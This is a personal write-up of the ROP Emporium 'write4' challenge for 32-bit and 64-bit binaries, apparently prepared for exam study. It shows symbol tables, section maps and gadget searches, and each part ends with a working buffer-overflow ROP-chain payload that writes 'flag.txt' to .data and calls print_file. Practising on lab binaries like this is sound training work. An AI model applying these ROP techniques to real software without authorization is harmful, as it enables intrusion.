# Write4

Objective:

Overflow buffer, write flag.txt to .data section of binary then call print_file with the .data section as the argument

Security:

|RELRO|STACK CANARY|NX|PIE|RPATH|RUNPATH|Symbols|FORTIFY|Fortified|Fortifiable|FILE|ASLR|
|-|-|-|-|-|-|-|-|-|-|-|-|
|Partial RELRO|No canary found|NX enabled|No PIE|No RPATH|No RUNPATH|72) Symbols|No|0|3|ret2win32|ASLR Disabled|

### 32 Bit Analysis

```
└─$ rabin2 -s write432 
[Symbols]

nth paddr      vaddr      bind   type   size lib name
―――――――――――――――――――――――――――――――――――――――――――――――――――――
5   ---------- 0x0804a020 GLOBAL NOTYPE 0        _edata
6   ---------- 0x0804a024 GLOBAL NOTYPE 0        _end
7   0x000005cc 0x080485cc GLOBAL OBJ    4        _IO_stdin_used
8   ---------- 0x0804a020 GLOBAL NOTYPE 0        __bss_start
9   0x0000037c 0x0804837c GLOBAL FUNC   0        _init
10  0x000005b4 0x080485b4 GLOBAL FUNC   0        _fini
1   0x00000154 0x08048154 LOCAL  SECT   0        .interp
2   0x00000168 0x08048168 LOCAL  SECT   0        .note.ABI-tag
3   0x00000188 0x08048188 LOCAL  SECT   0        .note.gnu.build-id
4   0x000001ac 0x080481ac LOCAL  SECT   0        .gnu.hash
5   0x000001e8 0x080481e8 LOCAL  SECT   0        .dynsym
6   0x00000298 0x08048298 LOCAL  SECT   0        .dynstr
7   0x00000324 0x08048324 LOCAL  SECT   0        .gnu.version
8   0x0000033c 0x0804833c LOCAL  SECT   0        .gnu.version_r
9   0x0000035c 0x0804835c LOCAL  SECT   0        .rel.dyn
10  0x00000364 0x08048364 LOCAL  SECT   0        .rel.plt
11  0x0000037c 0x0804837c LOCAL  SECT   0        .init
12  0x000003a0 0x080483a0 LOCAL  SECT   0        .plt
13  0x000003e0 0x080483e0 LOCAL  SECT   0        .plt.got
14  0x000003f0 0x080483f0 LOCAL  SECT   0        .text
15  0x000005b4 0x080485b4 LOCAL  SECT   0        .fini
16  0x000005c8 0x080485c8 LOCAL  SECT   0        .rodata
17  0x000005dc 0x080485dc LOCAL  SECT   0        .eh_frame_hdr
18  0x00000620 0x08048620 LOCAL  SECT   0        .eh_frame
19  0x00000efc 0x08049efc LOCAL  SECT   0        .init_array
20  0x00000f00 0x08049f00 LOCAL  SECT   0        .fini_array
21  0x00000f04 0x08049f04 LOCAL  SECT   0        .dynamic
22  0x00000ffc 0x08049ffc LOCAL  SECT   0        .got
23  0x00001000 0x0804a000 LOCAL  SECT   0        .got.plt
24  0x00001018 0x0804a018 LOCAL  SECT   0        .data
25  ---------- 0x0804a020 LOCAL  SECT   0        .bss
26  ---------- 0x00000000 LOCAL  SECT   0        .comment
27  ---------- 0x00000000 LOCAL  FILE   0        crtstuff.c
28  0x00000450 0x08048450 LOCAL  FUNC   0        deregister_tm_clones
29  0x00000490 0x08048490 LOCAL  FUNC   0        register_tm_clones
30  0x000004d0 0x080484d0 LOCAL  FUNC   0        __do_global_dtors_aux
31  ---------- 0x0804a020 LOCAL  OBJ    1        completed.7283
32  0x00000f00 0x08049f00 LOCAL  OBJ    0        __do_global_dtors_aux_fini_array_entry
33  0x00000500 0x08048500 LOCAL  FUNC   0        frame_dummy
34  0x00000efc 0x08049efc LOCAL  OBJ    0        __frame_dummy_init_array_entry
35  ---------- 0x00000000 LOCAL  FILE   0        write4.c
36  0x0000052a 0x0804852a LOCAL  FUNC   25       usefulFunction
37  ---------- 0x00000000 LOCAL  FILE   0        /tmp/ccNieWE5.o
38  0x00000543 0x08048543 LOCAL  NOTYPE 0        usefulGadgets
39  ---------- 0x00000000 LOCAL  FILE   0        crtstuff.c
40  0x00000730 0x08048730 LOCAL  OBJ    0        __FRAME_END__
41  ---------- 0x00000000 LOCAL  FILE   0        
42  0x00000f00 0x08049f00 LOCAL  NOTYPE 0        __init_array_end
43  0x00000f04 0x08049f04 LOCAL  OBJ    0        _DYNAMIC
44  0x00000efc 0x08049efc LOCAL  NOTYPE 0        __init_array_start
45  0x000005dc 0x080485dc LOCAL  NOTYPE 0        __GNU_EH_FRAME_HDR
46  0x00001000 0x0804a000 LOCAL  OBJ    0        _GLOBAL_OFFSET_TABLE_
47  0x000005b0 0x080485b0 GLOBAL FUNC   2        __libc_csu_fini
49  0x00000440 0x08048440 GLOBAL FUNC   4        __x86.get_pc_thunk.bx
50  0x00001018 0x0804a018 WEAK   NOTYPE 0        data_start
53  0x00001018 0x0804a018 GLOBAL NOTYPE 0        __data_start
55  0x0000101c 0x0804a01c GLOBAL OBJ    0        __dso_handle
58  0x00000550 0x08048550 GLOBAL FUNC   93       __libc_csu_init
61  0x00000430 0x08048430 GLOBAL FUNC   2        _dl_relocate_static_pie
62  0x000003f0 0x080483f0 GLOBAL FUNC   0        _start
63  0x000005c8 0x080485c8 GLOBAL OBJ    4        _fp_hw
65  0x00000506 0x08048506 GLOBAL FUNC   36       main
66  ---------- 0x0804a020 GLOBAL OBJ    0        __TMC_END__
1   0x000003b0 0x080483b0 GLOBAL FUNC   16       imp.pwnme
2   ---------- 0x000003e0 WEAK   NOTYPE 16       imp.__gmon_start__
3   0x000003c0 0x080483c0 GLOBAL FUNC   16       imp.__libc_start_main
4   0x000003d0 0x080483d0 GLOBAL FUNC   16       imp.print_file
```

```
└─$ gdb-pwndbg write432 
Reading symbols from write432...
(No debugging symbols found in write432)
pwndbg: loaded 192 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
pwndbg> info file
Symbols from "/home/george93/Desktop/offsec-prep/osed-prep/ROPEmporium/write4/write432/write432".
Local exec file:
	`/home/george93/Desktop/offsec-prep/osed-prep/ROPEmporium/write4/write432/write432', file type elf32-i386.
	Entry point: 0x80483f0
	0x08048154 - 0x08048167 is .interp
	0x08048168 - 0x08048188 is .note.ABI-tag
	0x08048188 - 0x080481ac is .note.gnu.build-id
	0x080481ac - 0x080481e8 is .gnu.hash
	0x080481e8 - 0x08048298 is .dynsym
	0x08048298 - 0x08048323 is .dynstr
	0x08048324 - 0x0804833a is .gnu.version
	0x0804833c - 0x0804835c is .gnu.version_r
	0x0804835c - 0x08048364 is .rel.dyn
	0x08048364 - 0x0804837c is .rel.plt
	0x0804837c - 0x0804839f is .init
	0x080483a0 - 0x080483e0 is .plt
	0x080483e0 - 0x080483e8 is .plt.got
	0x080483f0 - 0x080485b2 is .text
	0x080485b4 - 0x080485c8 is .fini
	0x080485c8 - 0x080485dc is .rodata
	0x080485dc - 0x08048620 is .eh_frame_hdr
	0x08048620 - 0x08048734 is .eh_frame
	0x08049efc - 0x08049f00 is .init_array
	0x08049f00 - 0x08049f04 is .fini_array
	0x08049f04 - 0x08049ffc is .dynamic
	0x08049ffc - 0x0804a000 is .got
	0x0804a000 - 0x0804a018 is .got.plt
	0x0804a018 - 0x0804a020 is .data
	0x0804a020 - 0x0804a024 is .bss
```

```
└─$ ropper -f write432 --search "pop"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop

[INFO] File: write432
0x08048525: pop ebp; lea esp, [ecx - 4]; ret; 
0x080485ab: pop ebp; ret; 
0x080485a8: pop ebx; pop esi; pop edi; pop ebp; ret; 
0x0804839d: pop ebx; ret; 
0x08048524: pop ecx; pop ebp; lea esp, [ecx - 4]; ret; 
0x080485aa: pop edi; pop ebp; ret; 
0x080485a9: pop esi; pop edi; pop ebp; ret; 
0x08048527: popal; cld; ret;

└─$ ropper -f write432 --search "mov" 
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: mov

[INFO] File: write432
0x080484e7: mov al, byte ptr [0xc9010804]; ret; 
0x0804846d: mov al, byte ptr [0xd0ff0804]; add esp, 0x10; leave; ret; 
0x080484ba: mov al, byte ptr [0xd2ff0804]; add esp, 0x10; leave; ret; 
0x080484e4: mov byte ptr [0x804a020], 1; leave; ret; 
0x08048543: mov dword ptr [edi], ebp; ret; 
0x080484b2: mov ebp, esp; sub esp, 0x10; push eax; push 0x804a020; call edx; 
0x08048466: mov ebp, esp; sub esp, 0x14; push 0x804a020; call eax; 
0x080484da: mov ebp, esp; sub esp, 8; call 0x450; mov byte ptr [0x804a020], 1; leave; ret; 
0x08048381: mov ebx, 0x81000000; ret; 
0x08048423: mov ebx, dword ptr [esp]; ret; 
0x0804847a: mov esp, 0x27; add bl, dh; ret;
```

```
└─$ gdb-pwndbg write432
Reading symbols from write432...
(No debugging symbols found in write432)
pwndbg: loaded 192 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
pwndbg> disas print_file
Dump of assembler code for function print_file@plt:
   0x080483d0 <+0>:	jmp    DWORD PTR ds:0x804a014
   0x080483d6 <+6>:	push   0x10
   0x080483db <+11>:	jmp    0x80483a0
End of assembler dump.
pwndbg> 
```

### 32 Bit Answer

- `python2 -c "print('A' * 44 + '\xaa\x85\x04\x08' + '\x18\xa0\x04\x08' + 'flag' + '\x43\x85\x04\x08' + '\xaa\x85\x04\x08' + '\x1c\xa0\x04\x08' + '.txt' + '\x43\x85\x04\x08' + '\xd0\x83\x04\x08' + 'AAAA' + '\x18\xa0\x04\x08')" | ./write432`

### 64 Bit Analysis

```
└─$ rabin2 -s write4 
[Symbols]

nth paddr      vaddr      bind   type   size lib name
―――――――――――――――――――――――――――――――――――――――――――――――――――――
5   ---------- 0x00601038 GLOBAL NOTYPE 0        _edata
6   ---------- 0x00601040 GLOBAL NOTYPE 0        _end
7   ---------- 0x00601038 GLOBAL NOTYPE 0        __bss_start
8   0x000004d0 0x004004d0 GLOBAL FUNC   0        _init
9   0x000006a4 0x004006a4 GLOBAL FUNC   0        _fini
1   0x00000238 0x00400238 LOCAL  SECT   0        .interp
2   0x00000254 0x00400254 LOCAL  SECT   0        .note.ABI-tag
3   0x00000274 0x00400274 LOCAL  SECT   0        .note.gnu.build-id
4   0x00000298 0x00400298 LOCAL  SECT   0        .gnu.hash
5   0x000002d0 0x004002d0 LOCAL  SECT   0        .dynsym
6   0x000003c0 0x004003c0 LOCAL  SECT   0        .dynstr
7   0x0000043c 0x0040043c LOCAL  SECT   0        .gnu.version
8   0x00000450 0x00400450 LOCAL  SECT   0        .gnu.version_r
9   0x00000470 0x00400470 LOCAL  SECT   0        .rela.dyn
10  0x000004a0 0x004004a0 LOCAL  SECT   0        .rela.plt
11  0x000004d0 0x004004d0 LOCAL  SECT   0        .init
12  0x000004f0 0x004004f0 LOCAL  SECT   0        .plt
13  0x00000520 0x00400520 LOCAL  SECT   0        .text
14  0x000006a4 0x004006a4 LOCAL  SECT   0        .fini
15  0x000006b0 0x004006b0 LOCAL  SECT   0        .rodata
16  0x000006c0 0x004006c0 LOCAL  SECT   0        .eh_frame_hdr
17  0x00000708 0x00400708 LOCAL  SECT   0        .eh_frame
18  0x00000df0 0x00600df0 LOCAL  SECT   0        .init_array
19  0x00000df8 0x00600df8 LOCAL  SECT   0        .fini_array
20  0x00000e00 0x00600e00 LOCAL  SECT   0        .dynamic
21  0x00000ff0 0x00600ff0 LOCAL  SECT   0        .got
22  0x00001000 0x00601000 LOCAL  SECT   0        .got.plt
23  0x00001028 0x00601028 LOCAL  SECT   0        .data
24  ---------- 0x00601038 LOCAL  SECT   0        .bss
25  ---------- 0x00000000 LOCAL  SECT   0        .comment
26  ---------- 0x00000000 LOCAL  FILE   0        crtstuff.c
27  0x00000560 0x00400560 LOCAL  FUNC   0        deregister_tm_clones
28  0x00000590 0x00400590 LOCAL  FUNC   0        register_tm_clones
29  0x000005d0 0x004005d0 LOCAL  FUNC   0        __do_global_dtors_aux
30  ---------- 0x00601038 LOCAL  OBJ    1        completed.7698
31  0x00000df8 0x00600df8 LOCAL  OBJ    0        __do_global_dtors_aux_fini_array_entry
32  0x00000600 0x00400600 LOCAL  FUNC   0        frame_dummy
33  0x00000df0 0x00600df0 LOCAL  OBJ    0        __frame_dummy_init_array_entry
34  ---------- 0x00000000 LOCAL  FILE   0        write4.c
35  0x00000617 0x00400617 LOCAL  FUNC   17       usefulFunction
36  ---------- 0x00000000 LOCAL  FILE   0        /tmp/cc0wK0o0.o
37  0x00000628 0x00400628 LOCAL  NOTYPE 0        usefulGadgets
38  ---------- 0x00000000 LOCAL  FILE   0        crtstuff.c
39  0x00000824 0x00400824 LOCAL  OBJ    0        __FRAME_END__
40  ---------- 0x00000000 LOCAL  FILE   0        
41  0x00000df8 0x00600df8 LOCAL  NOTYPE 0        __init_array_end
42  0x00000e00 0x00600e00 LOCAL  OBJ    0        _DYNAMIC
43  0x00000df0 0x00600df0 LOCAL  NOTYPE 0        __init_array_start
44  0x000006c0 0x004006c0 LOCAL  NOTYPE 0        __GNU_EH_FRAME_HDR
45  0x00001000 0x00601000 LOCAL  OBJ    0        _GLOBAL_OFFSET_TABLE_
46  0x000006a0 0x004006a0 GLOBAL FUNC   2        __libc_csu_fini
48  0x00001028 0x00601028 WEAK   NOTYPE 0        data_start
52  0x00001028 0x00601028 GLOBAL NOTYPE 0        __data_start
54  0x00001030 0x00601030 GLOBAL OBJ    0        __dso_handle
55  0x000006b0 0x004006b0 GLOBAL OBJ    4        _IO_stdin_used
56  0x00000630 0x00400630 GLOBAL FUNC   101      __libc_csu_init
59  0x00000550 0x00400550 GLOBAL FUNC   2        _dl_relocate_static_pie
60  0x00000520 0x00400520 GLOBAL FUNC   43       _start
62  0x00000607 0x00400607 GLOBAL FUNC   16       main
63  ---------- 0x00601038 GLOBAL OBJ    0        __TMC_END__
1   0x00000500 0x00400500 GLOBAL FUNC   16       imp.pwnme
2   ---------- 0x00000000 GLOBAL FUNC   16       imp.__libc_start_main
3   ---------- 0x00000000 WEAK   NOTYPE 16       imp.__gmon_start__
4   0x00000510 0x00400510 GLOBAL FUNC   16       imp.print_file
```

```
└─$ ropper -f write4 --search "pop" 
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop

[INFO] File: write4
0x000000000040068c: pop r12; pop r13; pop r14; pop r15; ret; 
0x000000000040068e: pop r13; pop r14; pop r15; ret; 
0x0000000000400690: pop r14; pop r15; ret; 
0x0000000000400692: pop r15; ret; 
0x000000000040057b: pop rbp; mov edi, 0x601038; jmp rax; 
0x000000000040068b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
0x000000000040068f: pop rbp; pop r14; pop r15; ret; 
0x0000000000400588: pop rbp; ret; 
0x0000000000400693: pop rdi; ret; 
0x0000000000400691: pop rsi; pop r15; ret; 
0x000000000040068d: pop rsp; pop r13; pop r14; pop r15; ret; 

└─$ ropper -f write4 --search "mov"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: mov

[INFO] File: write4
0x00000000004005e2: mov byte ptr [rip + 0x200a4f], 1; pop rbp; ret; 
0x0000000000400606: mov dword ptr [rbp + 0x48], edx; mov ebp, esp; call 0x500; mov eax, 0; pop rbp; ret; 
0x0000000000400629: mov dword ptr [rsi], edi; ret; 
0x0000000000400610: mov eax, 0; pop rbp; ret; 
0x00000000004004d5: mov eax, dword ptr [rip + 0x200b1d]; test rax, rax; je 0x4e2; call rax; 
0x00000000004004d5: mov eax, dword ptr [rip + 0x200b1d]; test rax, rax; je 0x4e2; call rax; add rsp, 8; ret; 
0x0000000000400609: mov ebp, esp; call 0x500; mov eax, 0; pop rbp; ret; 
0x00000000004005db: mov ebp, esp; call 0x560; mov byte ptr [rip + 0x200a4f], 1; pop rbp; ret; 
0x0000000000400619: mov ebp, esp; mov edi, 0x4006b4; call 0x510; nop; pop rbp; ret; 
0x000000000040061b: mov edi, 0x4006b4; call 0x510; nop; pop rbp; ret; 
0x000000000040057c: mov edi, 0x601038; jmp rax; 
0x0000000000400628: mov qword ptr [r14], r15; ret; 
0x00000000004004d4: mov rax, qword ptr [rip + 0x200b1d]; test rax, rax; je 0x4e2; call rax; 
0x00000000004004d4: mov rax, qword ptr [rip + 0x200b1d]; test rax, rax; je 0x4e2; call rax; add rsp, 8; ret; 
0x0000000000400608: mov rbp, rsp; call 0x500; mov eax, 0; pop rbp; ret; 
0x00000000004005da: mov rbp, rsp; call 0x560; mov byte ptr [rip + 0x200a4f], 1; pop rbp; ret; 
0x0000000000400618: mov rbp, rsp; mov edi, 0x4006b4; call 0x510; nop; pop rbp; ret; 
```

### 64 Bit Answer

- `python2 -c "print('A' * 40 + '\x90\x06\x40\x00\x00\x00\x00\x00' + '\x28\x10\x60\x00\x00\x00\x00\x00' + 'flag.txt' + '\x28\x06\x40\x00\x00\x00\x00\x00' + '\x93\x06\x40\x00\x00\x00\x00\x00' + '\x28\x10\x60\x00\x00\x00\x00\x00' + '\x10\x05\x40\x00\x00\x00\x00\x00')" | ./write4`